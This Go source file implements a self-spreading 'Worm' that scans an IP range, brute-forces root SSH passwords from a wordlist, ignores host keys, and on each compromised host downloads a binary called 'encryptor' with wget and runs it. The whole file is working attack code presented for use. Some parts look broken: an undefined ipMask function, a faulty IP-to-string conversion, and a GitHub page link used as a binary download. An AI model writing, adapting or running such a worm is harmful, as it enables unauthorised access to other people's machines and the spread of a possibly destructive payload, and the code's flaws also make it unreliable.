package main

import (
	"fmt"
	"time"
	"os"
	"bufio"
	"log"
	"net"
	
	"golang.org/x/crypto/ssh"
	"github.com/malfunkt/iprange"
)

type Worm struct {
	network string
}

func newWorm(NetworkAddresses string) *Worm {
	return &Worm{network: NetworkAddresses}
}

func (w *Worm) setNetwork(newNetwork string) {
	w.network = newNetwork
}

func (w *Worm) getCredentials() [][2]string {
	creds := [][2]string{}
	file, err := os.Open("wordlist.txt")
	if err != nil {
		log.Print("Error opening wordlist")
	}
	defer file.Close()
	
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		creds = append(creds, [2]string{"root", scanner.Text()})
	}

	return creds
}

func generateAddresses() []net.IP {
	mask := ipMask()
	
	list, err := iprange.ParseList(mask)
	if err != nil {
		log.Println(err)	
	}
	
	rng := list.Expand()
	return rng
}

func (w *Worm) spreadOverSSH() {
	ips := generateAddresses()
	for _, address := range ips {
		fmt.Printf("Attempting to connect to %s\n", address)
		for _, cred := range w.getCredentials() {
			user, passw := cred[0], cred[1]
			fmt.Printf("Attempting to connect to %s with username %s and password %s\n", address, user, passw)

			config := &ssh.ClientConfig{
				User:            user,
				Auth:            []ssh.AuthMethod{ssh.Password(passw)},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         10 * time.Second,
			}

			client, err := ssh.Dial("tcp", string(address)+":22", config)
			if err != nil {
				fmt.Printf("Can't connect to host on %s [%s, %s]\n", address, user, passw)
				continue
			}

			session, err := client.NewSession()
			if err != nil {
				fmt.Printf("Can't create session on %s [%s, %s]\n", address, user, passw)
			}

			defer session.Close()

			fmt.Printf("Succesfully connected to host on %s [%s, %s]\n", address, user, passw)

			command := "wget https://github.com/harperreynell/encryptor/blob/main/encryptor && chmod +x encryptor && ./encryptor"
			output, err := session.CombinedOutput(command)
			if err != nil {
				fmt.Printf("Can't execute command on %s [%s, %s]\n", address, user, passw)
			}

			fmt.Printf("%s", output)
		}

		fmt.Printf("\n\n\n")
	}
}

func main() {
	worm := newWorm("192.168.1.1")
	worm.spreadOverSSH()
}
